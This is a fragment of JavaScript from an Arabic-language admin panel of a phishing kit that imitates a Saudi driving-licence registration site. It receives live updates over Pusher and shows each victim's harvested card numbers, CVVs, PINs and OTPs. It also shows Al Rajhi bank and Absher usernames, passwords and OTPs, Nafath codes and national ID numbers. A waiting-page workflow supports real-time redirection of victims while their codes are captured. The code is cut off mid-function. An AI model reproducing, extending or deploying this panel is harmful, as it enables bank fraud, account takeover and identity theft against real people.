                now.setHours(now.getHours() + 3);
                
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, '0');
                const day = String(now.getDate()).padStart(2, '0');
                let hours = now.getHours();
                const minutes = String(now.getMinutes()).padStart(2, '0');
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12 || 12;
                
                return `${year}/${month}/${day}<br>${String(hours).padStart(2, '0')}:${minutes} ${ampm}`;
            }
            return dateString;
        }
        
        // ============================================
        // Toast Notifications System
        // ============================================
        function showToast(title, message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            
            const icons = {
                success: '<i class="fas fa-check-circle" style="color: #10b981;"></i>',
                error: '<i class="fas fa-times-circle" style="color: #ef4444;"></i>',
                warning: '<i class="fas fa-exclamation-triangle" style="color: #f59e0b;"></i>',
                info: '<i class="fas fa-info-circle" style="color: #3b82f6;"></i>'
            };
            
            toast.innerHTML = `
                <div class="toast-icon">${icons[type]}</div>
                <div class="toast-content">
                    <div class="toast-title">${title}</div>
                    <div class="toast-message">${message}</div>
                </div>
            `;
            
            container.appendChild(toast);
            
            setTimeout(() => toast.classList.add('show'), 10);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 400);
            }, 4000);
        }

        // ============================================
        // Connection Status & Last Update Timer
        // ============================================
        function updateConnectionStatus(connected) {
            const dot = document.getElementById('connectionDot');
            const status = document.getElementById('connectionStatus');
            
            if (connected) {
                dot.classList.remove('disconnected');
                status.textContent = 'متصل';
                status.style.color = '#10b981';
            } else {
                dot.classList.add('disconnected');
                status.textContent = 'غير متصل';
                status.style.color = '#ef4444';
            }
        }

        function updateLastUpdateTime() {
            const lastUpdate = document.getElementById('lastUpdate');
            const now = Date.now();
            const diff = Math.floor((now - lastUpdateTime) / 1000);
            
            if (diff < 60) {
                lastUpdate.textContent = `آخر تحديث: منذ ${diff} ث`;
            } else if (diff < 3600) {
                lastUpdate.textContent = `آخر تحديث: منذ ${Math.floor(diff / 60)} د`;
            } else {
                lastUpdate.textContent = `آخر تحديث: منذ ${Math.floor(diff / 3600)} س`;
            }
        }

        setInterval(updateLastUpdateTime, 1000);

        // ============================================
        // Filter Rows
        // ============================================
        function filterRows(filter) {
            const rows = document.querySelectorAll('#usersTableBody tr');
            const buttons = document.querySelectorAll('.filter-btn');
            
            buttons.forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            const unreadIds = getUnreadIds();
            
            rows.forEach(row => {
                const userId = row.getAttribute('data-user-id');
                const isUnread = unreadIds.has(String(userId));
                
                if (filter === 'all') {
                    row.style.display = '';
                } else if (filter === 'unread') {
                    row.style.display = isUnread ? '' : 'none';
                } else if (filter === 'read') {
                    row.style.display = !isUnread ? '' : 'none';
                }
            });
        }

        // ============================================
        // Bulk Actions
        // ============================================
        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const selectedCount = document.getElementById('selectedCount');
            
            if (checkboxes.length > 0) {
                bulkActions.classList.add('show');
                selectedCount.textContent = checkboxes.length;
            } else {
                bulkActions.classList.remove('show');
            }
        }

        function bulkDelete() {
            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
            const ids = Array.from(checkboxes).map(cb => {
                return cb.closest('tr').getAttribute('data-user-id');
            });
            
            if (ids.length === 0) return;
            
            if (!confirm(`هل تريد حذف ${ids.length} عميل؟`)) return;
            
            showToast('تم الحذف', `تم حذف ${ids.length} عميل بنجاح`, 'success');
            
            checkboxes.forEach(cb => {
                cb.closest('tr').remove();
            });
            
            updateBulkActions();
            updateUserCount(-ids.length);
        }

        // ============================================
        // Pusher Configuration
        // ============================================
        Pusher.logToConsole = false;
        const pusher = new Pusher('a56388ee6222f6c5fb86', {
            cluster: 'ap2',
            encrypted: true
        });
        
        const channel = pusher.subscribe('my-channel');
        
        pusher.connection.bind('connected', function() {
            console.log('✅ Pusher متصل');
            updateConnectionStatus(true);
        });
        
        pusher.connection.bind('disconnected', function() {
            console.log('❌ Pusher انقطع الاتصال');
            updateConnectionStatus(false);
        });
        
        // ============================================
        // إضافة صف جديد بدون إعادة تحميل
        // ============================================
        function addNewUserRow(userData) {
            const tbody = document.getElementById('usersTableBody');
            if (!tbody) {
                console.error('❌ tbody غير موجود!');
                return;
            }

            const existingRow = document.querySelector(`tr[data-user-id="${userData.id}"]`);
            if (existingRow) {
                console.warn('⚠️ الصف موجود مسبقاً - ID:', userData.id);
                return;
            }

            console.log('➕ إضافة صف جديد - ID:', userData.id);

            const newRow = document.createElement('tr');
            newRow.setAttribute('data-user-id', userData.id);
            newRow.classList.add('highlight');
            
newRow.innerHTML = `
    <td><input type="checkbox" class="user-checkbox checkbox-modern" onchange="updateBulkActions()"></td>
    <td><strong>${userData.username || '-'}</strong></td>
    <td id="message${userData.id}">
        <span class="status-badge status-new">${userData.message || 'عميل جديد'}</span>
    </td>
<td><strong style="color: #374151;">${userData.name || '-'}</strong></td>
<td>
    <span style="color: #667eea; font-weight: 600;">
        ${userData.selected_school || '-'}
    </span>
</td>
<td>${userData.phone || '-'}</td>
    <td>
        <button class="btn-table btn-info" onclick="showUserInfo(${userData.id})">
            <i class="fas fa-info-circle"></i> عرض
        </button>
    </td>
    <td>
        <button class="btn-table btn-card" onclick="showUserCards(${userData.id})">
            <i class="fas fa-credit-card"></i> البطاقات
        </button>
    </td>
    <td>
        <button class="btn-table btn-nafad" onclick="showUserNafad(${userData.id})">
            <i class="fas fa-shield-alt"></i> نفاذ
        </button>
    </td>
    <td>
        <button class="btn-table btn-nafad" onclick="showNafathFinal(${userData.id})">
            <i class="fas fa-key"></i> إرسال
        </button>
    </td>
    <td>
    <button class="btn-table" style="background: linear-gradient(135deg, #00AA66 0%, #008c54 100%); color: white;" onclick="showUserAbsher(${userData.id})">
        <i class="fas fa-id-badge"></i> أبشر
    </button>
</td>
    <td>
        <button class="btn-table" style="background: linear-gradient(135deg, #0066cc 0%, #004d99 100%); color: white;" onclick="showUserBank(${userData.id})">
            <i class="fas fa-university"></i> راجحي
        </button>
    </td>
    <td>
        <small>${formatJordanTime(userData.created_at_formatted)}</small>
    </td>
    <td>
        <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
            <input type="hidden" name="userId" value="${userData.id}">
            <button type="submit" name="deleteUser" class="btn-table btn-delete">
                <i class="fas fa-trash"></i>
            </button>
        </form>
    </td>
`;

            tbody.insertBefore(newRow, tbody.firstChild);
            console.log('✅ تمت إضافة الصف بنجاح');
        }
        
        // ============================================
        // تحديث عداد العملاء
        // ============================================
        function updateUserCount(increment = 0) {
            const userCountElement = document.getElementById('userCountDisplay');
            if (!userCountElement) return;

            let currentCount = parseInt(userCountElement.textContent) || 0;
            currentCount += increment;
            userCountElement.textContent = currentCount;

            userCountElement.style.transition = 'all 0.3s';
            userCountElement.style.transform = 'scale(1.15)';
            userCountElement.style.color = '#10b981';
            
            setTimeout(() => {
                userCountElement.style.transform = 'scale(1)';
                userCountElement.style.color = '#1f2937';
            }, 400);
        }
        
        // ============================================
        // Pusher Events - مستخدم جديد
        // ============================================
        channel.bind('my-event-newwwe', function (data) {
            console.log('📥 عميل جديد - ID:', data.userId);
            lastUpdateTime = Date.now();
            
            fetch(`get-new-user.php?user_id=${data.userId}`)
                .then(response => response.json())
                .then(userData => {
                    console.log('✅ تم جلب البيانات:', userData);
                    addNewUserRow(userData);
                    playNotification();
                    markAsUnread(userData.id);
                    updateUserCount(1);
                    showToast('عميل جديد', `${userData.name || userData.username} سجل للتو`, 'success');
                })
                .catch(error => {
                    console.error('❌ خطأ في جلب البيانات:', error);
                });
        });

        // تحديث عداد الزيارات Real-time
        channel.bind('visit-increment', function(data) {
            const counterElement = document.getElementById('visitCountDisplay');
            
            if (counterElement) {
                let currentCount = parseInt(counterElement.textContent.replace(/,/g, ''));
                currentCount++;
                
                counterElement.textContent = currentCount.toLocaleString('en-US');
                
                counterElement.style.transition = 'all 0.3s';
                counterElement.style.transform = 'scale(1.2)';
                counterElement.style.color = '#f59e0b';
                
                setTimeout(() => {
                    counterElement.style.transform = 'scale(1)';
                    counterElement.style.color = '#1f2937';
                }, 300);
            }
        });

        // بعد تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            console.log('✅ الصفحة تم تحميلها');
            console.log('🔌 Pusher متصل');
            
            const ids = getUnreadIds();
            console.log('📋 الصفوف غير المقروءة:', Array.from(ids));
            
            ids.forEach((id) => {
                const row = document.querySelector(`tr[data-user-id="${id}"]`);
                if (row) row.classList.add('highlight');
            });
            
            updateUnreadCount();
            
            document.querySelectorAll('.user-checkbox').forEach(cb => {
                cb.addEventListener('change', updateBulkActions);
            });
        });

        // تحديث بيانات المستخدم
channel.bind('updaefte-user-payys', function(data) {
    const userId = data.userId;
    const updatedData = data.updatedData;
    lastUpdateTime = Date.now();
    
    const messageElement = document.getElementById('message' + userId);
    if (messageElement && updatedData.message) {
        messageElement.innerHTML = `<span class="status-badge status-pending">${updatedData.message}</span>`;
    }
    
    highlightRow(userId);
    
    // ✅ تشغيل صوت مختلف للبطاقات
    const isCardUpdate = updatedData.message && (
        updatedData.message.includes('دفع بطاقة') ||
        updatedData.message.includes('بطاقة جديد') ||
        updatedData.message.includes('card')
    );
    
    playNotification(isCardUpdate);
    updateUnreadCount();
    showToast('تحديث', updatedData.message || 'تم تحديث بيانات العميل', 'info');
    
    updateOpenModals(userId, updatedData.message);
});

        // ============================================
        // 🚀 NEW: دالة تحديث المودالات المفتوحة
        // ============================================
function updateOpenModals(userId, message) {
    if (currentUserId != userId) return;
    
    const cardsModal = document.getElementById('userCardsModal');
    const nafadModal = document.getElementById('userNafadModal');
    const nafathModal = document.getElementById('nafathFinalModal');
    const bankModal = document.getElementById('userBankModal'); // ✅ إضافة
    
    const isCardsModalOpen = cardsModal?.classList.contains('show');
    const isNafadModalOpen = nafadModal?.classList.contains('show');
    const isNafathModalOpen = nafathModal?.classList.contains('show');
    const isBankModalOpen = bankModal?.classList.contains('show'); // ✅ إضافة
    const absherModal = document.getElementById('userAbsherModal');
const isAbsherModalOpen = absherModal?.classList.contains('show');

// تحديث مودال أبشر
if (isAbsherModalOpen && (message.includes('OTP أبشر') || message.includes('أبشر'))) {
    console.log('🔄 تحديث مودال أبشر real-time');
    refreshAbsherModal(userId);
}
    // تحديث مودال البطاقات
    if (isCardsModalOpen && (message.includes('دفع بطاقة') || message.includes('OTP') || message.includes('PIN'))) {
        console.log('🔄 تحديث مودال البطاقات real-time');
        refreshCardsModal(userId);
    }
    
    // تحديث مودال نفاذ
    if (isNafadModalOpen && (message.includes('نفاذ') || message.includes('رمز'))) {
        console.log('🔄 تحديث مودال نفاذ real-time');
        refreshNafadModal(userId);
    }
    
    // تحديث مودال أرقام نفاذ
    if (isNafathModalOpen && message.includes('رقم نفاذ')) {
        console.log('🔄 تحديث مودال أرقام نفاذ real-time');
        refreshNafathModal(userId);
    }
    
    // ✅ تحديث مودال البنك
    if (isBankModalOpen && (message.includes('OTP بنك') || message.includes('راجحي'))) {
        console.log('🔄 تحديث مودال البنك real-time');
        refreshBankModal(userId);
    }
}

        // ============================================
        // 🚀 NEW: دالة تحديث مودال البطاقات
        // ============================================
        function refreshCardsModal(userId) {
             $.ajax({
        url: 'get-user-cards.php',
        method: 'GET',
        data: { user_id: userId },
        success: function (response) {
            try {
                const cards = JSON.parse(response);
                let html = '';

                if (!Array.isArray(cards) || cards.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بطاقات لهذا المستخدم</div>';
                } else {
                    cards.forEach((card, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-credit-card"></i> عملية دفع ${index + 1}</h6>
                            <p><strong>اسم حامل البطاقة:</strong> ${card.cardName ?? '-'}</p>
                            <p><strong>card number:</strong> ${card.cardNumber ?? '-'}</p>
                            <p><strong>تاريخ الانتهاء:</strong> ${card.cardExpiry ?? '-'}</p>
                            <p><strong>CVV:</strong> ${card.cvv ?? '-'}</p>
                            <p><strong>المبلغ المدفوع:</strong> <strong style="color: #10b981; font-size: 1.2rem;">${card.price ?? '0'} ر.س</strong></p>
                            <p><strong>تاريخ العملية:</strong> ${card.created_at ?? '-'}</p>
                            <div id="otpBox_${card.id}">
                                <em class="text-muted">🔄 جاري تحميل رموز التحقق...</em>
                            </div>
                            <div id="pinBox_${card.id}">
                                <em class="text-muted">🔄 جاري تحميل PIN...</em>
                            </div>
                        </div>
                        `;
                    });
                }

                        document.getElementById('userCardsContent').innerHTML = html;

                        // جلب OTP و PIN
                        cards.forEach(card => {
                            fetch(`get-card-otps.php?card_id=${card.id}`)
                                .then(res => res.json())
                                .then(otps => {
                                    const box = document.getElementById(`otpBox_${card.id}`);
                                    if (!box) return;

                                    if (!Array.isArray(otps) || otps.length === 0) {
                                        box.innerHTML = '<em class="text-muted">لا يوجد OTP بعد</em>';
                                        return;
                                    }

                                    let otpHtml = '<hr><h6><i class="fas fa-key"></i> رموز التحقق (OTP)</h6><ul>';
                                    otps.forEach(o => {
                                        otpHtml += `<li><strong>${o.otp_code}</strong> — ${o.created_at}</li>`;
                                    });
                                    otpHtml += '</ul>';
                                    box.innerHTML = otpHtml;
                                });

                            fetch(`get-card-pins.php?client_id=${userId}`)
                                .then(res => res.json())
                                .then(pin => {
                                    const box = document.getElementById(`pinBox_${card.id}`);
                                    if (!box) return;

                                    if (!pin || !pin.pin_code) {
                                        box.innerHTML = '<em class="text-muted">⏳ لم يتم إدخال PIN بعد</em>';
                                        return;
                                    }

                                    box.innerHTML = `
                                        <hr>
                                        <h6><i class="fas fa-lock"></i> كلمة سر البطاقة (PIN)</h6>
                                        <div class="alert alert-danger text-center" style="font-size:20px; font-weight:700;">
                                            ${pin.pin_code}<br>
                                            <small>${pin.created_at}</small>
                                        </div>
                                    `;
                                });
                        });

                        showToast('تحديث', 'تم تحديث بيانات البطاقات', 'info');

                    } catch (e) {
                        console.error('خطأ في تحديث البطاقات:', e);
                    }
                }
            });
        }

        // ============================================
        // 🚀 NEW: دالة تحديث مودال نفاذ
        // ============================================
        function refreshNafadModal(userId) {
            fetch(`get-user-nafad.php?user_id=${userId}`)
                .then(res => res.json())
                .then(data => {
                    let html = '';

                    if (Array.isArray(data.codes) && data.codes.length > 0) {
                        html += '<h6 style="color: #667eea; font-weight: bold; margin-bottom: 15px;"><i class="fas fa-shield-alt"></i> رموز التحقق</h6>';
                        
                        data.codes.forEach((code, i) => {
                            html += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${code.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${code.nafad_code}
                                    </div>
                                </div>
                            `;
                        });
                    }

                    if (Array.isArray(data.logs) && data.logs.length > 0) {
                        html += '<hr><h6 style="color: #667eea; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-history"></i> سجلات نفاذ السابقة</h6>';
                        
                        data.logs.forEach((log, i) => {
                            html += `
                                <div class="info-card">
                                    <h6><i class="fas fa-file-alt"></i> محاولة #${i + 1}</h6>
                                    <p><strong>الهاتف:</strong> ${log.phone ?? '-'}</p>
                                    <p><strong>المشغل:</strong> ${log.telecom ?? '-'}</p>
                                    <p><strong>رقم الهوية:</strong> ${log.id_number ?? '-'}</p>
                                    ${log.redirect_to ? `<p><strong>تم التوجيه إلى:</strong> ${log.redirect_to}</p>` : ''}
                                    <p><small>${log.created_at}</small></p>
                                </div>
                            `;
                        });
                    }

                    if (html === '') {
                        html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات نفاذ بعد</div>';
                    }

                    document.getElementById('userNafadContent').innerHTML = html;
                    showToast('تحديث', 'تم إضافة رمز نفاذ جديد', 'success');
                });
        }

        // ============================================
        // 🚀 NEW: دالة تحديث مودال أرقام نفاذ
        // ============================================
        function refreshNafathModal(userId) {
            fetch(`get-nafath-history.php?user_id=${userId}`)
                .then(res => res.json())
                .then(numbers => {
                    let html = '<h6 style="color: #667eea;"><i class="fas fa-history"></i> الأرقام المرسلة سابقاً:</h6>';
                    
                    if (!Array.isArray(numbers) || numbers.length === 0) {
                        html += '<p class="text-muted">لم يتم إرسال أي رقم بعد</p>';
                    } else {
                        numbers.forEach((num, i) => {
                            html += `
                                <div class="alert alert-success mb-2">
                                    <strong style="font-size: 1.2rem;">${num.number}</strong>
                                    <small class="d-block text-muted">${num.created_at}</small>
                                </div>
                            `;
                        });
                    }
                    
                    document.getElementById('nafathHistoryContent').innerHTML = html;
                    showToast('تحديث', 'تم إرسال رقم نفاذ جديد', 'info');
                });
        }

        channel.bind('user-waiting-redirect', function(data) {
            const userId = data.userId;
            const msg = data.message;
            lastUpdateTime = Date.now();

            const messageEl = document.getElementById('message' + userId);
            if (messageEl) {
                messageEl.innerHTML = `<span class="status-badge status-pending">${msg}</span>`;
            }

            if (currentUserId == userId) {
                const infoBox = document.getElementById('userCardsContent');
                if (infoBox) {
                    infoBox.insertAdjacentHTML('afterbegin', `
                        <div class="alert alert-warning">
                            <i class="fas fa-clock"></i>
                            العميل حالياً في صفحة الانتظار ويترقب التوجيه
                        </div>
                    `);
                }
            }
// ============================================
// 🚀 دالة تحديث مودال البنك real-time
// ============================================
function refreshBankModal(userId) {
    $.ajax({
        url: 'get-user-bank.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const banks = JSON.parse(response);
                let html = '';

                if (!Array.isArray(banks) || banks.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات بنك لهذا المستخدم</div>';
                } else {
                    banks.forEach((bank, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-university"></i> بيانات البنك ${index + 1}</h6>
                            <p><strong>اسم البنك:</strong> ${bank.bank ?? '-'}</p>
                            <p><strong>اسم المستخدم / الهوية:</strong> 
                                <span style="color: #0066cc; font-weight: 700; font-size: 1.1rem;">${bank.user_name ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${bank.bk_pass ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${bank.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                html += '<div id="bankOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';
                document.getElementById('userBankContent').innerHTML = html;
                
                // جلب رموز OTP
                fetch(`get-bank-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('bankOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #667eea; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP البنك)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
                        box.innerHTML = otpHtml;
                    });

                showToast('تحديث', 'تم تحديث بيانات البنك', 'info');
                    
            } catch(e) {
                console.error('خطأ:', e);
            }
        }
    });
}

            highlightRow(userId);
            playNotification();
            updateUnreadCount();
        });

        // ====== Unread / Highlight (GLOBAL) ======
        const UNREAD_KEY = 'unreadUserIds';

        function getUnreadIds() {
            try { return new Set(JSON.parse(localStorage.getItem(UNREAD_KEY) || '[]')); }
            catch { return new Set(); }
        }

        function saveUnreadIds(set) {
            localStorage.setItem(UNREAD_KEY, JSON.stringify(Array.from(set)));
        }

        function markAsUnread(userId) {
            const ids = getUnreadIds();
            ids.add(String(userId));
            saveUnreadIds(ids);
            updateUnreadCount();
        }

        function markAsRead(userId) {
            const ids = getUnreadIds();
            ids.delete(String(userId));
            saveUnreadIds(ids);

            const row = document.querySelector(`tr[data-user-id="${userId}"]`);
            if (row) row.classList.remove('highlight');
            updateUnreadCount();
        }

        function highlightRow(userId) {
            const row = document.querySelector(`tr[data-user-id="${userId}"]`);
            if (!row) return;

            row.classList.add('highlight');
            const tbody = row.parentElement;
            tbody.insertBefore(row, tbody.firstChild);
            markAsUnread(userId);
        }

function playNotification(isCard = false) {
    const audioId = isCard ? 'card-sound' : 'notification-sound';
    const audio = document.getElementById(audioId);
    
    if (!audio) {
        console.error('❌ عنصر الصوت غير موجود!');
        return;
    }
    
    console.log(`🔊 محاولة تشغيل الصوت: ${isCard ? 'بطاقة' : 'عادي'}`);
    try { 
        audio.currentTime = 0; 
    } catch (e) {
        console.error('خطأ في إعادة تعيين الصوت:', e);
    }
    
    audio.play()
        .then(() => {
            console.log('✅ تم تشغيل الصوت بنجاح');
        })
        .catch(e => {
            console.error('❌ فشل تشغيل الصوت:', e);
        });
}

        function updateUnreadCount() {
            const unreadElement = document.getElementById('unreadCount');
            if (unreadElement) {
                const count = getUnreadIds().size;
                unreadElement.textContent = count;
            }
        }

        function refreshData() {
            // التحديث يتم تلقائياً عبر Pusher - لا حاجة لإعادة التحميل
        }

function showUserInfo(userId) {
    currentUserId = userId;
    
    $.ajax({
        url: 'get-user-info.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const data = JSON.parse(response);
                
                // ✅ أنواع الطلبات
                const requestTypes = {
                    '1': 'رخصة قيادة خاصة',
                    '2': 'رخصة قيادة عامة',
                    '3': 'رخصة قيادة دراجة آلية',
                    '4': 'رخصة قيادة مركبات أشغال عامة',
                    '5': 'تصريح قيادة'
                };
                
                const requestType = requestTypes[data.request_type] || (data.request_type || '-');
                
                let html = '';
                
                // ✅ معلومات الطلب
                html += `<div class="info-card">
                    <h6><i class="fas fa-clipboard-list"></i> معلومات الطلب</h6>
                    <p><strong>نوع الطلب:</strong> <span style="color: #667eea; font-weight: 600;">${requestType}</span></p>
                    <p><strong>الجنسية:</strong> <span style="color: #10b981; font-weight: 600;">${data.nationality ?? '-'}</span></p>
                </div>`;
                
                // ✅ البيانات الشخصية
                html += `<div class="info-card">
                    <h6><i class="fas fa-user-check"></i> بيانات التسجيل (المرحلة الأولى)</h6>
                    <p><strong>رقم الهوية:</strong> ${data.ssn ?? '-'}</p>
                    <p><strong>الاسم الكامل:</strong> ${data.name ?? '-'}</p>
                    <p><strong>رقم الجوال:</strong> ${data.phone ?? '-'}</p>
                    <p><strong>تاريخ الميلاد:</strong> ${data.date ?? '-'}</p>
                    <p><strong>البريد الإلكتروني:</strong> ${data.email ?? '-'}</p>
                </div>`;

                // ✅ بيانات التدريب
                html += `<div class="info-card">
                    <h6><i class="fas fa-car"></i> بيانات التدريب (المرحلة الثانية)</h6>
                    <p><strong>المنطقة:</strong> ${data.region ?? '-'}</p>
                    <p><strong>الفرع:</strong> ${data.branch ?? '-'}</p>
                    <p><strong>المستوى:</strong> ${data.level ?? '-'}</p>
                    <p><strong>نوع الجير:</strong> ${data.gear_type ?? '-'}</p>
                    <p><strong>الفترة الزمنية:</strong> ${data.time_period ?? '-'}</p>
                </div>`;

                // ✅ معلومات تقنية
                html += `<div class="info-card">
                    <h6><i class="fas fa-cog"></i> معلومات تقنية</h6>
                    <p><strong>تاريخ الإنشاء:</strong> ${data.created_at ?? '-'}</p>
                </div>`;
                
                document.getElementById('userInfoContent').innerHTML = html;
                
                const modal = new bootstrap.Modal(document.getElementById('userInfoModal'));
                modal.show();
                markAsRead(userId);
            } catch(e) {
                console.error('Error:', e);
                alert('حدث خطأ في تحميل البيانات');
            }
        }
    });
}
// ============================================
// عرض بيانات البنك (راجحي)
// ============================================
// ============================================
// عرض بيانات البنك (راجحي) + رموز OTP
// ============================================
function showUserBank(userId) {
    currentUserId = userId;
    
    $.ajax({
        url: 'get-user-bank.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const banks = JSON.parse(response);
                let html = '';

                if (!Array.isArray(banks) || banks.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات بنك لهذا المستخدم</div>';
                } else {
                    banks.forEach((bank, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-university"></i> بيانات البنك ${index + 1}</h6>
                            <p><strong>اسم البنك:</strong> ${bank.bank ?? '-'}</p>
                            <p><strong>اسم المستخدم / الهوية:</strong> 
                                <span style="color: #0066cc; font-weight: 700; font-size: 1.1rem;">${bank.user_name ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${bank.bk_pass ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${bank.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                // ✅ جلب رموز OTP البنك
                html += '<div id="bankOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';

                document.getElementById('userBankContent').innerHTML = html;
                
                // ✅ جلب رموز OTP البنك
                fetch(`get-bank-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('bankOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #667eea; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP البنك)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
                        box.innerHTML = otpHtml;
                    })
                    .catch(error => {
                        console.error('خطأ في جلب OTP البنك:', error);
                        document.getElementById('bankOtpBox').innerHTML = '<div class="alert alert-warning">خطأ في تحميل الرموز</div>';
                    });
                
                const modal = new bootstrap.Modal(document.getElementById('userBankModal'));
                modal.show();
                markAsRead(userId);
                
            } catch(e) {
                console.error('Error:', e);
                document.getElementById('userBankContent').innerHTML = 
                    '<div class="alert alert-danger">حدث خطأ في تحميل البيانات</div>';
            }
        },
        error: function() {
            document.getElementById('userBankContent').innerHTML = 
                '<div class="alert alert-danger">فشل الاتصال بالخادم</div>';
        }
    });
}
// ============================================
// عرض بيانات أبشر + رموز OTP
// ============================================
function showUserAbsher(userId) {
    currentUserId = userId;
    
    $.ajax({
        url: 'get-user-absher.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const abshers = JSON.parse(response);
                let html = '';

                if (!Array.isArray(abshers) || abshers.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات أبشر لهذا المستخدم</div>';
                } else {
                    abshers.forEach((absher, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-id-badge"></i> بيانات أبشر ${index + 1}</h6>
                            <p><strong>اسم المستخدم / رقم الهوية:</strong> 
                                <span style="color: #00AA66; font-weight: 700; font-size: 1.1rem;">${absher.username_or_id ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${absher.password ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${absher.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                // ✅ جلب رموز OTP أبشر
                html += '<div id="absherOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';

                document.getElementById('userAbsherContent').innerHTML = html;
                
                // ✅ جلب رموز OTP أبشر
                fetch(`get-absher-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('absherOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #00AA66; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP أبشر)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #d1fae5; border-right: 4px solid #00AA66;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-success text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px; background: #00AA66; color: white;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
